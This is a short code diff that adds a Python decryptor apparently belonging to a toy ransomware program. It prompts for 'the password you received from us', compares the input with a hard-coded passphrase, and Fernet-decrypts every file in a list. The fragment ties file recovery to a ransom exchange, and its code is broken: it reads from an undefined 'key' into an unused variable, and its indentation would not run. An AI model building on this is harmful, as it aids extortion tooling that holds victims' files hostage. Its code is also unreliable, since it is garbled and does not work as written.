@@ -1,1 +1,20 @@
 
+
+
+
+
+
+
+print(allfiles)
+
+with open("key.key", "rb") as thekey:
+	password = key.read()
+passphrase = "R0mo3!1x"
+userpass = input("Enter the password you received from us: ")
+        if userpass == passphrase:
+ 	            for file in allfiles:
+	            with open(file, "rb") as thefile:
+		                  contents = thefile.read()
+	                    content_decr = Fernet(key).decrypt(contents)
+	             with open(file, "wb") as thefile:
+		           thefile.write(content_decr)
